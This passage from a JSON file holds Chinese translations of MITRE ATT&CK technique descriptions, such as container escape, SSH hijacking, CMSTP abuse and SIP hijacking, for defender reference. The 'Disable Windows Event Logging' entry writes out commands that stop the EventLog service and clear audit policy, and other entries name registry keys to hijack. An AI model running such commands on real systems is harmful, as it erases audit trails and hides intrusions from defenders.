        "translated_description": "对手可能会根据与恶意软件相关的互斥体的存在来限制执行或操作。互斥体是一种用于同步访问资源的锁定机制。一次只能有一个线程或进程获取互斥体。(引用: Microsoft Mutexes)\n\n虽然本地互斥体仅存在于给定进程内，允许多个线程同步访问资源，但系统互斥体可用于同步多个进程的活动。(引用: Microsoft Mutexes) 通过创建与特定恶意软件相关的唯一系统互斥体，对手可以验证系统是否已经被破坏。(引用: Sans Mutexes 2012)\n\n在 Linux 环境中，恶意软件可能会尝试获取互斥文件上的锁定。如果恶意软件能够获取锁定，它将继续执行；如果失败，它将退出以避免创建自己的第二个实例。(引用: Intezer RedXOR 2021)(引用: Deep Instinct BPFDoor 2023)\n\n互斥体名称可能是硬编码的，也可能使用可预测的算法动态生成。(引用: ICS Mutexes 2015)"
    },
    "Ignore Process Interrupts": {
        "translated_name": "忽略进程中断",
        "translated_description": "对手可能通过执行隐藏在进程中断信号中的命令来规避防御机制。许多操作系统使用信号传递消息以控制进程行为。命令解释器通常包括特定的命令/标志，忽略错误和其他挂起，例如当活动会话的用户注销时。(引用: Linux Signal Man) 这些中断信号也可能被防御工具和/或分析师用来暂停或终止指定的运行进程。\n\n对手可能会调用使用 `nohup`、[PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue` 或类似命令的进程，这些命令可能对挂起免疫。(引用: nohup Linux Man)(引用: Microsoft PowerShell SilentlyContinue) 这可能使恶意命令和恶意软件在系统事件（例如用户注销或其 C2 网络连接终止）中继续执行。\n\n隐藏在进程中断信号中可能允许恶意软件继续执行，但与[陷阱](https://attack.mitre.org/techniques/T1546/005)不同，这不会建立[持久性](https://attack.mitre.org/tactics/TA0003)，因为一旦实际终止，进程将不会重新调用。"
    },
    "Escape to Host": {
        "translated_name": "逃逸到主机",
        "translated_description": "对手可能会突破容器以访问底层主机。这可以使对手从主机级别访问其他容器化资源或访问主机本身。原则上，容器化资源应提供应用程序功能的明确分离，并与主机环境隔离。(引用: Docker Overview)\n\n对手可能通过多种方式逃逸到主机环境。例如，创建一个配置为使用绑定参数挂载主机文件系统的容器，这允许对手在主机上放置有效负载并执行控制实用程序，例如 cron；利用特权容器在底层主机上运行命令或加载恶意内核模块；或滥用系统调用，例如 `unshare` 和 `keyctl` 以提升权限并窃取秘密。(引用: Docker Bind Mounts)(引用: Trend Micro Privileged Container)(引用: Intezer Doki July 20)(引用: Container Escape)(引用: Crowdstrike Kubernetes Container Escape)(引用: Keyctl-unmask)\n\n此外，对手可能能够利用挂载的容器管理套接字（例如 `docker.sock`）的受损容器，通过[容器管理命令](https://attack.mitre.org/techniques/T1609)突破容器。(引用: Container Escape) 对手还可能通过[特权提升利用](https://attack.mitre.org/techniques/T1068)逃逸，例如利用全局符号链接中的漏洞以访问主机机器的根目录。(引用: Windows Server Containers Are Open)\n\n访问主机可能为对手提供实现后续目标的机会，例如建立持久性、在环境中横向移动、访问主机上运行的其他容器或在主机上设置命令和控制通道。"
    },
    "Shortcut Modification": {
        "translated_name": "快捷方式修改",
        "translated_description": "对手可能会创建或修改快捷方式，以便在系统启动或用户登录期间执行程序。快捷方式或符号链接用于引用其他文件或程序，当快捷方式被点击或由系统启动过程执行时，将打开或执行这些文件或程序。\n\n对手可能会滥用启动文件夹中的快捷方式来执行他们的工具并实现持久性。(引用: Shortcut for Persistence) 虽然通常用作感染链中的有效负载（例如[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)），对手也可能创建一个新的快捷方式作为间接手段，同时滥用[伪装](https://attack.mitre.org/techniques/T1036)使恶意快捷方式看起来像合法程序。对手还可以编辑目标路径或完全替换现有快捷方式，以便执行他们的恶意软件而不是预期的合法程序。\n\n快捷方式还可以通过实现其他方法来滥用以建立持久性。例如，LNK 浏览器扩展可能会被修改（例如[浏览器扩展](https://attack.mitre.org/techniques/T1176)）以持久地启动恶意软件。"
    },
    "Application Window Discovery": {
        "translated_name": "应用程序窗口发现",
        "translated_description": "对手可能会尝试获取打开的应用程序窗口的列表。窗口列表可以传达有关系统使用方式的信息。(引用: Prevailion DarkWatchman 2021) 例如，应用程序窗口的信息可以用于识别潜在的数据收集目标以及识别安全工具（[安全软件发现](https://attack.mitre.org/techniques/T1518/001)）以规避。(引用: ESET Grandoreiro April 2020)\n\n对手通常滥用系统功能进行此类枚举。例如，他们可能通过本机系统功能（例如[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)命令和[本机 API](https://attack.mitre.org/techniques/T1106)函数）收集信息。"
    },
    "Email Account": {
        "translated_name": "电子邮件账户",
        "translated_description": "对手可能会尝试获取电子邮件地址和账户的列表。对手可能会尝试转储 Exchange 地址列表，例如全局地址列表 (GAL)。(引用: Microsoft Exchange Address Lists)\n\n在本地 Exchange 和 Exchange Online 中，可以使用 <code>Get-GlobalAddressList</code> PowerShell cmdlet 通过经过身份验证的会话从域中获取电子邮件地址和账户。(引用: Microsoft getglobaladdresslist)(引用: Black Hills Attacking Exchange MailSniper, 2016)\n\n在 Google Workspace 中，GAL 通过 Google Workspace Sync for Microsoft Outlook (GWSMO) 服务与 Microsoft Outlook 用户共享。此外，Google Workspace 目录允许用户获取组织内其他用户的列表。(引用: Google Workspace Global Access List)"
    },
    "Time Based Evasion": {
        "translated_name": "基于时间的规避",
        "translated_description": "对手可能会采用各种基于时间的方法来检测和规避虚拟化和分析环境。这可能包括枚举基于时间的属性，例如正常运行时间或系统时钟，以及使用计时器或其他触发器来规避虚拟机环境 (VME) 或沙箱，特别是那些自动化或仅运行有限时间的环境。\n\n对手可能会采用各种基于时间的规避方法，例如使用编程睡眠命令或本机系统调度功能（例如[计划任务/作业](https://attack.mitre.org/techniques/T1053)）在初始执行时延迟恶意软件功能。延迟还可能基于等待特定受害者条件满足（例如系统时间、事件等）或采用计划的[多阶段通道](https://attack.mitre.org/techniques/T1104)以避免分析和审查。(引用: Deloitte Environment Awareness)\n\n还可以使用良性命令或其他操作来延迟恶意软件执行。循环或其他不必要的命令重复，例如[Ping](https://attack.mitre.org/software/S0097)，可能用于延迟恶意软件执行，并可能超过自动化分析环境的时间阈值。(引用: Revil Independence Day)(引用: Netskope Nitol) 另一种变体，通常称为 API 锤击，涉及对[本机 API](https://attack.mitre.org/techniques/T1106)函数进行各种调用，以延迟执行（同时也可能通过垃圾数据过载分析环境）。(引用: Joe Sec Nymaim)(引用: Joe Sec Trickbot)\n\n对手还可能使用时间作为检测沙箱和分析环境的指标，特别是那些试图操纵时间机制以模拟更长时间的环境。例如，对手可能能够通过在执行睡眠函数之前和之后采样和计算环境时间戳的预期值来识别加速时间的沙箱。(引用: ISACA Malware Tricks)"
    },
    "CMSTP": {
        "translated_name": "CMSTP",
        "translated_description": "对手可能会滥用CMSTP来代理执行恶意代码。Microsoft连接管理器配置文件安装程序（CMSTP.exe）是一个命令行程序，用于安装连接管理器服务配置文件。(引用: Microsoft Connection Manager Oct 2009) CMSTP.exe接受安装信息文件（INF）作为参数，并安装用于远程访问连接的服务配置文件。\n\n对手可能会向CMSTP.exe提供感染了恶意命令的INF文件。(引用: Twitter CMSTP Usage Jan 2018) 类似于[Regsvr32](https://attack.mitre.org/techniques/T1218/010) / “Squiblydoo”，CMSTP.exe可能被滥用来加载和执行DLL(引用: MSitPros CMSTP Aug 2017) 和/或来自远程服务器的COM脚本文件（SCT）。(引用: Twitter CMSTP Jan 2018) (引用: GitHub Ultimate AppLocker Bypass List) (引用: Endurant CMSTP July 2018) 由于CMSTP.exe是一个合法的二进制文件，可能由Microsoft签名，因此这种执行也可能绕过AppLocker和其他应用程序控制防御。\n\nCMSTP.exe还可以被滥用来[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)并通过自动提升的COM接口从恶意INF执行任意命令。(引用: MSitPros CMSTP Aug 2017) (引用: GitHub Ultimate AppLocker Bypass List) (引用: Endurant CMSTP July 2018)"
    },
    "SSH Hijacking": {
        "translated_name": "SSH劫持",
        "translated_description": "对手可能会劫持合法用户的SSH会话，在环境中横向移动。安全外壳（SSH）是Linux和macOS系统上的标准远程访问方式。它允许用户通过加密隧道连接到另一系统，通常通过密码、证书或使用非对称加密密钥对进行身份验证。\n\n为了从受损主机横向移动，对手可能会利用通过公钥认证在活动SSH会话中与其他系统建立的信任关系，劫持到另一个系统的现有连接。这可能通过破坏SSH代理本身或访问代理的套接字来实现。如果对手能够获得root访问权限，那么劫持SSH会话可能很简单。(引用: Slideshare Abusing SSH)(引用: SSHjack Blackhat)(引用: Clockwork SSH Agent Hijacking)(引用: Breach Post-mortem SSH Hijack)\n\n[SSH劫持](https://attack.mitre.org/techniques/T1563/001)不同于使用[SSH](https://attack.mitre.org/techniques/T1021/004)，因为它劫持现有的SSH会话，而不是使用[有效帐户](https://attack.mitre.org/techniques/T1078)创建新会话。"
    },
    "Disable Windows Event Logging": {
        "translated_name": "禁用Windows事件日志记录",
        "translated_description": "对手可能会禁用Windows事件日志记录，以限制可用于检测和审计的数据。Windows事件日志记录用户和系统活动，如登录尝试、进程创建等。(引用: Windows Log Events) 这些数据被安全工具和分析师用来生成检测。\n\nEventLog服务维护来自各种系统组件和应用程序的事件日志。(引用: EventLog_Core_Technologies) 默认情况下，服务在系统启动时自动启动。由本地安全策略（secpol.msc）维护的审核策略定义了EventLog服务记录的系统事件。可以通过运行secpol.msc，然后导航到<code>Security Settings\\Local Policies\\Audit Policy</code>以获取基本审核策略设置，或<code>Security Settings\\Advanced Audit Policy Configuration</code>以获取高级审核策略设置来更改安全审核策略设置。(引用: Audit_Policy_Microsoft)(引用: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code>也可以用来设置审核策略。(引用: auditpol)\n\n对手可能会针对系统范围的日志记录或特定应用程序的日志记录。例如，可以使用<code>Set-Service -Name EventLog -Status Stopped</code>或<code>sc config eventlog start=disabled</code>命令禁用Windows EventLog服务（然后手动停止服务，使用<code>Stop-Service -Name EventLog</code>）。(引用: Disable_Win_Event_Logging)(引用: disable_win_evt_logging) 此外，可以通过修改<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code>中的“Start”值，然后重新启动系统以使更改生效来禁用服务。(引用: disable_win_evt_logging)\n\n有几种方法可以通过注册表项修改禁用EventLog服务。首先，在没有管理员权限的情况下，对手可以修改<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>键中的“Start”值，然后重新启动系统以禁用安全事件日志。(引用: winser19_file_overwrite_bug_twitter) 其次，具有管理员权限的对手可以修改<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code>和<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code>中的相同值，以禁用整个事件日志。(引用: disable_win_evt_logging)\n\n此外，对手可能会使用<code>auditpol</code>及其子命令在命令提示符中禁用审核或清除审核策略。为了启用或禁用指定的设置或审核类别，对手可能会使用<code>/success</code>或<code>/failure</code>参数。例如，<code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code>关闭帐户登录类别的审核。(引用: auditpol.exe_STRONTIC)(引用: T1562.002_redcanaryco) 要清除审核策略，对手可能会运行以下命令：<code>auditpol /clear /y</code>或<code>auditpol /remove /allusers</code>。(引用: T1562.002_redcanaryco)\n\n通过禁用Windows事件日志记录，对手可以在留下更少的证据的情况下进行操作。"
    },
    "Scheduled Transfer": {
        "translated_name": "计划传输",
        "translated_description": "对手可能会安排数据外传仅在一天中的某些时间或某些间隔进行。这可以用来将流量模式与正常活动或可用性混合。\n\n当使用计划外传时，可能还会应用其他外传技术将信息传出网络，例如[通过C2通道外传](https://attack.mitre.org/techniques/T1041)或[通过替代协议外传](https://attack.mitre.org/techniques/T1048)。"
    },
    "SMB/Windows Admin Shares": {
        "translated_name": "SMB/Windows管理员共享",
        "translated_description": "对手可能会使用[有效帐户](https://attack.mitre.org/techniques/T1078)与远程网络共享进行交互，使用服务器消息块（SMB）。然后，对手可能会以登录用户的身份执行操作。\n\nSMB是Windows机器在同一网络或域上共享文件、打印机和串行端口的协议。对手可能会使用SMB与文件共享进行交互，允许他们在网络中横向移动。Linux和macOS的SMB实现通常使用Samba。\n\nWindows系统具有仅管理员可访问的隐藏网络共享，提供远程文件复制和其他管理功能。例如网络共享包括`C$`、`ADMIN$`和`IPC$`。对手可能会结合管理员级别的[有效帐户](https://attack.mitre.org/techniques/T1078)使用此技术，通过SMB远程访问网络系统，(引用: Wikipedia Server Message Block) 与系统进行远程过程调用（RPC）交互，(引用: TechNet RPC) 传输文件，并通过远程执行运行传输的二进制文件。依赖于通过SMB/RPC进行身份验证会话的示例执行技术包括[计划任务/作业](https://attack.mitre.org/techniques/T1053)、[服务执行](https://attack.mitre.org/techniques/T1569/002)和[Windows管理工具](https://attack.mitre.org/techniques/T1047)。对手还可以使用NTLM哈希访问系统上的管理员共享，使用[传递哈希](https://attack.mitre.org/techniques/T1550/002)和某些配置和补丁级别。(引用: Microsoft Admin Shares)"
    },
    "Implant Internal Image": {
        "translated_name": "植入内部镜像",
        "translated_description": "对手可能会在获得环境访问权限后植入带有恶意代码的云或容器镜像，以建立持久性。Amazon Web Services（AWS）Amazon Machine Images（AMIs）、Google Cloud Platform（GCP）镜像和Azure镜像以及流行的容器运行时（如Docker）可以被植入或后门化。与[上传恶意软件](https://attack.mitre.org/techniques/T1608/001)不同，此技术侧重于对手在受害者环境中的注册表中植入镜像。根据基础设施的配置方式，如果基础设施配置工具被指示始终使用最新镜像，这可能提供持久访问。(引用: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\n已经开发了一种工具来促进在云容器镜像中植入后门。(引用: Rhino Labs Cloud Backdoor September 2019) 如果对手访问了受损的AWS实例，并具有列出可用容器镜像的权限，他们可能会植入后门，例如[Web Shell](https://attack.mitre.org/techniques/T1505/003)。(引用: Rhino Labs Cloud Image Backdoor Technique Sept 2019)"
    },
    "Protocol Tunneling": {
        "translated_name": "协议隧道",
        "translated_description": "对手可能会将网络通信隧道化到和从受害者系统，以避免检测/网络过滤和/或访问其他无法访问的系统。隧道化涉及显式地将一个协议封装在另一个协议中。这种行为可能通过与现有流量混合来隐藏恶意流量和/或提供外层加密（类似于VPN）。隧道化还可以启用网络数据包的路由，否则这些数据包将无法到达预期目的地，例如SMB、RDP或其他将被网络设备过滤或无法通过互联网路由的流量。\n\n有多种方法可以将一个协议封装在另一个协议中。例如，对手可能会执行SSH隧道（也称为SSH端口转发），这涉及通过加密的SSH隧道转发任意数据。(引用: SSH Tunneling)\n\n对手还可能在[动态解析](https://attack.mitre.org/techniques/T1568)期间滥用[协议隧道](https://attack.mitre.org/techniques/T1572)。称为DNS over HTTPS（DoH），解析C2基础设施的查询可能封装在加密的HTTPS数据包中。(引用: BleepingComp Godlua JUL19)\n\n对手还可能结合[代理](https://attack.mitre.org/techniques/T1090)和/或[协议或服务模拟](https://attack.mitre.org/techniques/T1001/003)使用[协议隧道](https://attack.mitre.org/techniques/T1572)进一步隐藏C2通信和基础设施。"
    },
    "Control Panel": {
        "translated_name": "控制面板",
        "translated_description": "对手可能会滥用control.exe来代理执行恶意有效负载。Windows控制面板进程二进制文件（control.exe）处理控制面板项的执行，这些项是允许用户查看和调整计算机设置的实用程序。\n\n控制面板项是注册的可执行文件（.exe）或控制面板（.cpl）文件，后者实际上是重命名的动态链接库（.dll）文件，导出<code>CPlApplet</code>函数。(引用: Microsoft Implementing CPL)(引用: TrendMicro CPL Malware Jan 2014) 为了便于使用，控制面板项通常包括在注册并加载到控制面板后可供用户使用的图形菜单。(引用: Microsoft Implementing CPL) 控制面板项可以直接从命令行执行，通过应用程序编程接口（API）调用程序化执行，或通过双击文件执行。(引用: Microsoft Implementing CPL) (引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)\n\n恶意控制面板项可以通过[网络钓鱼](https://attack.mitre.org/techniques/T1566)活动传递(引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)或作为多阶段恶意软件的一部分执行。(引用: Palo Alto Reaver Nov 2017) 控制面板项，特别是CPL文件，还可能绕过应用程序和/或文件扩展名允许列表。\n\n对手还可以将恶意DLL文件（.dll）重命名为控制面板文件扩展名（.cpl）并将它们注册到<code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>。即使这些注册的DLL不符合CPL文件规范并且不导出<code>CPlApplet</code>函数，它们仍会通过其<code>DllEntryPoint</code>在控制面板执行时加载和执行。不导出<code>CPlApplet</code>的CPL文件不能直接执行。(引用: ESET InvisiMole June 2020)"
    },
    "Network Address Translation Traversal": {
        "translated_name": "网络地址转换遍历",
        "translated_description": "对手可能通过修改网络设备的网络地址转换 (NAT) 配置来跨越网络边界。对 NAT 的恶意修改可能使对手能够绕过对流量路由的限制，从而将受信任和不受信任的网络分开。\n\n在将数据包从一个网络传递到另一个网络的过程中，路由器和防火墙等网络设备可能会实施 NAT。在执行 NAT 时，网络设备将重写 IP 地址头的源地址和/或目标地址。一些网络设计需要 NAT 才能使数据包跨越边界设备。这种情况的一个典型例子是内部网络使用不可路由的互联网地址的环境。(引用: RFC1918)\n\n当对手控制了网络边界设备时，他们可以利用现有的 NAT 配置在两个分离的网络之间发送流量，或者他们可以实施自己设计的 NAT 配置。在需要 NAT 才能正常工作的网络设计中，这使对手能够克服固有的路由限制，这些限制通常会阻止他们访问边界设备后面的受保护系统。在不需要 NAT 的网络设计中，地址转换可以被对手用来掩盖他们的活动，因为更改跨越网络边界设备的数据包的地址可以使防御者更难监控数据传输。\n\n对手可能会使用[补丁系统映像](https://attack.mitre.org/techniques/T1601/001)来更改网络设备的操作系统，实施他们自己的自定义 NAT 机制以进一步掩盖他们的活动。"
    },
    "Upload Tool": {
        "translated_name": "上传工具",
        "translated_description": "对手可能会将工具上传到第三方或对手控制的基础设施，以便在目标过程中访问。工具可以是开源或闭源的，免费或商业的。工具可以被对手用于恶意目的，但（与恶意软件不同）并非旨在用于这些目的（例如：[PsExec](https://attack.mitre.org/software/S0029)）。对手可能会上传工具以支持他们的操作，例如通过将其放置在可通过互联网访问的 Web 服务器上，使其在受害者网络中可用，以启用[工具传输](https://attack.mitre.org/techniques/T1105)。\n\n工具可能被放置在对手先前购买/租用的基础设施上([获取基础设施](https://attack.mitre.org/techniques/T1583))或被他们以其他方式妥协的基础设施上([妥协基础设施](https://attack.mitre.org/techniques/T1584))。(引用: Dell TG-3390) 工具还可以在 Web 服务上进行阶段性存储，例如对手控制的 GitHub 仓库，或在使用户能够轻松配置应用程序的 Platform-as-a-Service 提供商上。(引用: Dragos Heroku Watering Hole)(引用: Malwarebytes Heroku Skimmers)(引用: Intezer App Service Phishing)\n\n对手可以通过让受损的受害者机器直接从第三方托管位置（例如：非对手控制的 GitHub 仓库）下载工具，包括工具的原始托管站点，来避免上传工具的需要。"
    },
    "Security Support Provider": {
        "translated_name": "安全支持提供者",
        "translated_description": "对手可能会滥用安全支持提供者 (SSP) 在系统启动时执行 DLL。Windows SSP DLL 在系统启动时加载到本地安全机构 (LSA) 进程中。一旦加载到 LSA 中，SSP DLL 就可以访问存储在 Windows 中的加密和明文密码，例如任何登录用户的域密码或智能卡 PIN。\n\nSSP 配置存储在两个注册表项中：<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> 和 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>。对手可能会修改这些注册表项以添加新的 SSP，这些 SSP 将在系统下次启动时加载，或者在调用 AddSecurityPackage Windows API 函数时加载。(引用: Graeber 2014)"
    },
    "Use Alternate Authentication Material": {
        "translated_name": "使用替代身份验证材料",
        "translated_description": "对手可能会使用替代身份验证材料，例如密码哈希、Kerberos 票证和应用程序访问令牌，以在环境中横向移动并绕过正常的系统访问控制。\n\n身份验证过程通常需要有效的身份（例如，用户名）以及一个或多个身份验证因素（例如，密码、PIN、物理智能卡、令牌生成器等）。替代身份验证材料是系统在用户或应用程序通过提供有效身份和所需的身份验证因素成功进行身份验证后合法生成的。替代身份验证材料也可能在身份创建过程中生成。(引用: NIST Authentication)(引用: NIST MFA)\n\n缓存替代身份验证材料允许系统验证身份已成功进行身份验证，而无需用户重新输入身份验证因素。由于系统必须维护替代身份验证材料——无论是在内存中还是在磁盘上——它可能面临通过[凭据访问](https://attack.mitre.org/tactics/TA0006)技术被盗的风险。通过窃取替代身份验证材料，对手能够绕过系统访问控制并在不知道明文密码或任何其他身份验证因素的情况下对系统进行身份验证。"
    },
    "Threat Intel Vendors": {
        "translated_name": "威胁情报供应商",
        "translated_description": "对手可能会搜索威胁情报供应商的私人数据，以获取可用于目标过程的信息。威胁情报供应商可能提供付费的订阅源或门户，提供比公开报告更多的数据。尽管敏感细节（例如客户名称和其他标识符）可能被编辑，但这些信息可能包含有关漏洞的趋势，例如目标行业、归因声明和成功的 TTP/对策。(引用: D3Secutrity CTI Feeds)\n\n对手可能会在私人威胁情报供应商数据中搜索可操作的信息。威胁行为者可能会寻找有关其自身活动的信息/指标，以及其他对手进行的活动，这些活动可能与其目标行业、能力/目标或其他操作关注点一致。供应商报告的信息还可能揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或 [获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如：[利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190) 或 [外部远程服务](https://attack.mitre.org/techniques/T1133)）。"
    },
    "Exfiltration Over Other Network Medium": {
        "translated_name": "通过其他网络介质外传",
        "translated_description": "对手可能会尝试通过与命令和控制通道不同的网络介质外传数据。如果命令和控制网络是有线互联网连接，则外传可能通过例如 WiFi 连接、调制解调器、蜂窝数据连接、蓝牙或其他射频 (RF) 通道进行。\n\n如果对手有足够的访问权限或接近度，并且连接可能没有像主要互联网连接通道那样受到保护或防御，对手可能会选择这样做，因为它没有通过相同的企业网络路由。"
    },
    "Network Device Configuration Dump": {
        "translated_name": "网络设备配置转储",
        "translated_description": "对手可能会访问网络配置文件以收集有关设备和网络的敏感数据。网络配置是包含确定设备操作参数的文件。设备通常在操作时存储配置的内存副本，并在设备重置后加载到非易失性存储中的单独配置。对手可以检查配置文件以揭示有关目标网络及其布局、网络设备及其软件或识别合法帐户和凭据的信息，以供以后使用。\n\n对手可以使用常见的管理工具和协议，例如简单网络管理协议 (SNMP) 和智能安装 (SMI) 访问网络配置文件。(引用: US-CERT TA18-106A Network Infrastructure Devices 2018)(引用: Cisco Blog Legacy Device Attacks) 这些工具可用于从配置存储库查询特定数据或配置设备以导出配置以供以后分析。"
    },
    "Gather Victim Identity Information": {
        "translated_name": "收集受害者身份信息",
        "translated_description": "对手可能会收集有关受害者身份的信息，以在目标过程中使用。身份信息可能包括各种详细信息，包括个人数据（例如：员工姓名、电子邮件地址、安全问题回答等）以及敏感信息，如凭据或多因素认证（MFA）配置。\n\n对手可能通过各种方式收集这些信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)直接引诱。用户信息也可以通过其他主动方式（即[主动扫描](https://attack.mitre.org/techniques/T1595)）枚举，例如探测和分析身份验证服务的响应，这些响应可能会揭示系统中的有效用户名或与这些用户名相关的MFA方法。(引用: GrimBlog UsernameEnum)(引用: Obsidian SSPR Abuse 2023) 受害者的信息也可能通过在线或其他可访问的数据集暴露给对手（例如，[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）。(引用: OPM Leak)(引用: Register Deloitte)(引用: Register Uber)(引用: Detectify Slack Tokens)(引用: Forbes GitHub Creds)(引用: GitHub truffleHog)(引用: GitHub Gitrob)(引用: CNET Leaks)\n\n收集这些信息可能会揭示其他形式的侦察机会（例如，[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)），建立操作资源（例如，[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如，[网络钓鱼](https://attack.mitre.org/techniques/T1566)或[有效账户](https://attack.mitre.org/techniques/T1078)）。"
    },
    "Disable or Modify System Firewall": {
        "translated_name": "禁用或修改系统防火墙",
        "translated_description": "对手可能会禁用或修改系统防火墙，以绕过限制网络使用的控制。更改可能包括禁用整个机制以及添加、删除或修改特定规则。这可以通过多种方式完成，具体取决于操作系统，包括通过命令行、编辑Windows注册表项和Windows控制面板。\n\n修改或禁用系统防火墙可能使对手的C2通信、横向移动和/或数据外传得以进行，否则这些操作将不被允许。例如，对手可能会为知名协议（如RDP）添加新的防火墙规则，使用非传统且可能安全性较低的端口（即[非标准端口](https://attack.mitre.org/techniques/T1571)）。(引用: change_rdp_port_conti)\n\n对手还可能修改主机网络设置，间接操纵系统防火墙，例如接口带宽或网络连接请求阈值。(引用: Huntress BlackCat) 与启用滥用各种[远程服务](https://attack.mitre.org/techniques/T1021)相关的设置也可能间接修改防火墙规则。"
    },
    "Archive Collected Data": {
        "translated_name": "归档收集的数据",
        "translated_description": "对手可能会在外传之前压缩和/或加密收集的数据。压缩数据可以帮助混淆收集的数据，并最小化通过网络发送的数据量。(引用: DOJ GRU Indictment Jul 2018) 加密可以用于隐藏正在外传的信息，以避免被检测到或在防御者检查时使外传不那么显眼。\n\n压缩和加密都是在外传之前进行的，可以使用实用程序、第三方库或自定义方法执行。"
    },
    "SIP and Trust Provider Hijacking": {
        "translated_name": "SIP和信任提供者劫持",
        "translated_description": "对手可能会篡改SIP和信任提供者组件，以在进行签名验证检查时误导操作系统和应用程序控制工具。在用户模式下，Windows Authenticode(引用: Microsoft Authenticode)数字签名用于验证文件的来源和完整性，这些变量可能用于建立对签名代码的信任（例如，具有有效Microsoft签名的驱动程序可能被视为安全）。签名验证过程由WinVerifyTrust应用程序编程接口（API）函数处理，(引用: Microsoft WinVerifyTrust)该函数接受查询并与适当的信任提供者协调，信任提供者负责验证签名的参数。(引用: SpectorOps Subverting Trust Sept 2017)\n\n由于可执行文件类型和相应签名格式的多样性，Microsoft创建了称为主题接口包（SIP）的软件组件(引用: EduardosBlog SIPs July 2008)，以在API函数和文件之间提供抽象层。SIP负责启用API函数创建、检索、计算和验证签名。大多数文件格式（可执行文件、PowerShell、安装程序等）都有唯一的SIP，目录签名提供了一个通用的解决方案(引用: Microsoft Catalog Files and Signatures April 2017)，并由全局唯一标识符（GUID）标识。(引用: SpectorOps Subverting Trust Sept 2017)\n\n类似于[代码签名](https://attack.mitre.org/techniques/T1553/002)，对手可能会滥用此架构来颠覆信任控制并绕过仅允许合法签名代码在系统上执行的安全策略。对手可能会劫持SIP和信任提供者组件，以误导操作系统和应用程序控制工具将恶意（或任何）代码分类为签名代码：(引用: SpectorOps Subverting Trust Sept 2017)\n\n* 修改<code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code>中的<code>Dll</code>和<code>FuncName</code>注册表值，这些值指向提供SIP的CryptSIPDllGetSignedDataMsg函数的动态链接库（DLL），该函数从签名文件中检索编码的数字证书。通过指向恶意制作的DLL，该DLL导出的函数始终返回已知的良好签名值（例如，Microsoft签名的便携式可执行文件），而不是文件的真实签名，对手可以将可接受的签名值应用于使用该SIP的所有文件(引用: GitHub SIP POC Sept 2017)（尽管可能会发生哈希不匹配，从而使签名无效，因为函数返回的哈希与从文件计算的值不匹配）。\n* 修改<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code>中的<code>Dll</code>和<code>FuncName</code>注册表值，这些值指向提供SIP的CryptSIPDllVerifyIndirectData函数的DLL，该函数验证文件的计算哈希与签名哈希值是否匹配。通过指向恶意制作的DLL，该DLL导出的函数始终返回TRUE（表示验证成功），对手可以成功验证使用该SIP的任何文件（具有合法签名）(引用: GitHub SIP POC Sept 2017)（无论是否劫持前面提到的CryptSIPDllGetSignedDataMsg函数）。此注册表值也可以重定向到现有DLL中的适当导出函数，从而避免在磁盘上放置和执行新文件的要求。\n* 修改<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code>中的<code>DLL</code>和<code>Function</code>注册表值，这些值指向提供信任提供者FinalPolicy函数的DLL，该函数是解码和解析签名并进行大多数信任决策的地方。类似于劫持SIP的CryptSIPDllVerifyIndirectData函数，此值可以重定向到现有DLL中的适当导出函数或恶意制作的DLL（尽管信任提供者的实现很复杂）。\n* **注意：** 通过[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)也可以在不修改注册表的情况下进行上述劫持。\n\n劫持SIP或信任提供者组件还可以启用持久代码执行，因为这些恶意组件可能会被任何执行代码签名或签名验证的应用程序调用。(引用: SpectorOps Subverting Trust Sept 2017)"
    },
    "Browser Session Hijacking": {
        "translated_name": "浏览器会话劫持",
